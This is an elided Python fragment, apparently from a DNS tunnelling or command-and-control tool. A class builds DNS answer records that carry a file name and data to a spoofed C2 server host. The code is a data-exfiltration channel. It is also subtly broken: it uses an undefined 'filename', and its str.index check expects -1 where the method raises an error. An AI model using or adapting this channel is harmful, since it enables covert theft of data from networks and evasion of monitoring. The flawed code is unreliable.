...
class DataRequest:
    ...
    def build(self):
        reformatted_filename = "." + filename + ("." if filename.index('.') == -1 else "") 
        ...
        dns = DNS(
            ...
            an=DNSRR(rrname=CC_SERVER_SPOOFED_HOST + reformatted_filename, type=PACKET_OPTIONS['DNS']['AN']['TYPE'], rdata=data)
        )
